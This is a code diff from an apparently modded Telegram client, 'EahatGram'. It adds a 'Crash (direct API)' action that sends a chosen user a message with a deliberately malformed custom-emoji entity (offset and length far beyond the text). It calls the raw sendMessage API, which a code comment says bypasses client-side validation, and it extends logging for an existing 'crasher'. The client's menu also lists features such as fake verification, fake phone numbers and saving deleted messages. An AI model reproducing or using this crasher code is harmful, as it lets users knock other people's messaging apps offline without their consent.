@@ -724,6 +724,7 @@ private final class EahatGramArguments {
     let context: AccountContext
     let selectPeer: () -> Void
     let sendCrasher: () -> Void
+    let sendCrasherDirect: () -> Void
     let addGiftToProfile: () -> Void
     let addCustomGiftToProfile: () -> Void
     let clearGifts: () -> Void
@@ -778,6 +779,7 @@ private final class EahatGramArguments {
         context: AccountContext,
         selectPeer: @escaping () -> Void,
         sendCrasher: @escaping () -> Void,
+        sendCrasherDirect: @escaping () -> Void,
         addGiftToProfile: @escaping () -> Void,
         addCustomGiftToProfile: @escaping () -> Void,
         clearGifts: @escaping () -> Void,
@@ -831,6 +833,7 @@ private final class EahatGramArguments {
         self.context = context
         self.selectPeer = selectPeer
         self.sendCrasher = sendCrasher
+        self.sendCrasherDirect = sendCrasherDirect
         self.addGiftToProfile = addGiftToProfile
         self.addCustomGiftToProfile = addCustomGiftToProfile
         self.clearGifts = clearGifts
@@ -1012,6 +1015,7 @@ private struct EahatGramState: Equatable {
 private enum EahatGramEntry: ItemListNodeEntry {
     case selectPeer(String)
     case crasher
+    case crasherDirect
     case addGiftToProfile
     case addCustomGiftToProfile
     case clearGifts
@@ -1077,7 +1081,7 @@ private enum EahatGramEntry: ItemListNodeEntry {
 
     var section: ItemListSectionId {
         switch self {
-        case .selectPeer, .crasher, .addGiftToProfile, .clearGifts, .removeAllContacts, .removeAllCalls, .nftUsernameTag, .nftUsernamePrice, .addNftUsernameTag, .fakePhoneNumber, .fakeRate, .fakeRateLevel, .fakeVerify, .targetHud, .liquidGlass, .replyQuote, .ghostMode, .fakeOnline, .saveDeletedMessages, .saveEditedMessages, .noLags, .bogatiUi, .noWarning, .downFolder, .customUiTheme, .viewUnread2Read, .voiceMod, .voiceModPreset, .voiceModV2, .voiceModV2Voice, .useDirectRpc, .refreshResponses:
+        case .selectPeer, .crasher, .crasherDirect, .addGiftToProfile, .clearGifts, .removeAllContacts, .removeAllCalls, .nftUsernameTag, .nftUsernamePrice, .addNftUsernameTag, .fakePhoneNumber, .fakeRate, .fakeRateLevel, .fakeVerify, .targetHud, .liquidGlass, .replyQuote, .ghostMode, .fakeOnline, .saveDeletedMessages, .saveEditedMessages, .noLags, .bogatiUi, .noWarning, .downFolder, .customUiTheme, .viewUnread2Read, .voiceMod, .voiceModPreset, .voiceModV2, .voiceModV2Voice, .useDirectRpc, .refreshResponses:
             return EahatGramSection.controls.rawValue
         case .farmBotUsername, .farmCommand, .farmInterval, .addFarmJob, .farmJobEnabled, .farmJobInfo, .removeFarmJob:
             return EahatGramSection.farm.rawValue
@@ -1106,6 +1110,8 @@ private enum EahatGramEntry: ItemListNodeEntry {
             return 100
         case .crasher:
             return 101
+        case .crasherDirect:
+            return 102
         case .addGiftToProfile:
             return 0
         case .clearGifts:
@@ -1243,6 +1249,12 @@ private enum EahatGramEntry: ItemListNodeEntry {
             }
         case .crasher:
             if case .crasher = rhs {
+                return true
+            } else {
+                return false
+            }
+        case .crasherDirect:
+            if case .crasherDirect = rhs {
                 return true
             } else {
                 return false
@@ -1648,13 +1660,26 @@ private enum EahatGramEntry: ItemListNodeEntry {
             return ItemListActionItem(
                 presentationData: presentationData,
                 systemStyle: .glass,
-                title: "Crash",
+                title: "Crash (enqueue)",
                 kind: .generic,
                 alignment: .natural,
                 sectionId: self.section,
                 style: .blocks,
                 action: {
                     arguments.sendCrasher()
+                }
+            )
+        case .crasherDirect:
+            return ItemListActionItem(
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: "Crash (direct API)",
+                kind: .generic,
+                alignment: .natural,
+                sectionId: self.section,
+                style: .blocks,
+                action: {
+                    arguments.sendCrasherDirect()
                 }
             )
         case .addGiftToProfile:
@@ -2600,6 +2625,7 @@ private func eahatGramEntries(
     case .test:
         entries.append(.selectPeer(state.selectedPeerTitle.isEmpty ? "Not selected" : state.selectedPeerTitle))
         entries.append(.crasher)
+        entries.append(.crasherDirect)
         entries.append(.useDirectRpc(state.useDirectRpc))
         entries.append(.refreshResponses)
 
@@ -2826,8 +2852,70 @@ private func eahatGramScreen(context: AccountContext, starsContext: StarsContext
                 bubbleUpEmojiOrStickersets: []
             )
             
-            let _ = enqueueMessages(account: context.account, peerId: targetPeerId, messages: [message]).start()
-            appendResponse("crasher sent to peerId=\(targetPeerId.toInt64()) offset=\(malformedOffset) length=\(malformedLength)")
+            appendResponse("crasher sending to peerId=\(targetPeerId.toInt64()) offset=\(malformedOffset) length=\(malformedLength) textLen=\(messageText.count)")
+            
+            let _ = (enqueueMessages(account: context.account, peerId: targetPeerId, messages: [message])
+            |> deliverOnMainQueue).start(next: { messageIds in
+                let hasMessageId = messageIds.contains(where: { $0 != nil })
+                if hasMessageId {
+                    if let firstId = messageIds.first, let messageId = firstId {
+                        appendResponse("crasher enqueued messageId=\(messageId.id) namespace=\(messageId.namespace) peerId=\(messageId.peerId.toInt64())")
+                    } else {
+                        appendResponse("crasher enqueued hasMessageId=true but first is nil")
+                    }
+                } else {
+                    appendResponse("crasher enqueued but all messageIds are nil")
+                }
+            }, error: { error in
+                appendResponse("crasher failed error=\(error)")
+            }, completed: {
+                appendResponse("crasher signal completed")
+            })
+        },
+        sendCrasherDirect: {
+            let currentState = stateValue.with { $0 }
+            guard let targetPeerId = currentState.selectedPeerId else {
+                appendResponse("crasherDirect failed reason=NO_PEER_SELECTED")
+                return
+            }
+            
+            // Send via direct API call to bypass enqueue validation
+            let messageText = "test"
+            let malformedOffset = 1000
+            let malformedLength = 100
+            let randomId = Int64.random(in: Int64.min...Int64.max)
+            
+            // Build Api.MessageEntity.messageEntityCustomEmoji directly
+            let apiEntity = Api.MessageEntity.messageEntityCustomEmoji(
+                offset: Int32(malformedOffset),
+                length: Int32(malformedLength),
+                documentId: 5377305978079288312
+            )
+            
+            appendResponse("crasherDirect sending via API peerId=\(targetPeerId.toInt64()) offset=\(malformedOffset) length=\(malformedLength)")
+            
+            let _ = (context.account.network.request(Api.functions.messages.sendMessage(
+                flags: 0,
+                peer: Api.InputPeer.inputPeerUser(userId: targetPeerId.id._internalGetInt64Value(), accessHash: 0),
+                replyTo: nil,
+                message: messageText,
+                randomId: randomId,
+                replyMarkup: nil,
+                entities: [apiEntity],
+                scheduleDate: nil,
+                sendAs: nil,
+                quickReplyShortcut: nil,
+                effect: nil,
+                invertMedia: nil,
+                factcheck: nil
+            ))
+            |> deliverOnMainQueue).start(next: { updates in
+                appendResponse("crasherDirect API response updates=\(type(of: updates))")
+            }, error: { error in
+                appendResponse("crasherDirect API error=\(error)")
+            }, completed: {
+                appendResponse("crasherDirect API completed")
+            })
         },
         addGiftToProfile: {
             let controller = eahatGramAddGiftToProfileScreen(
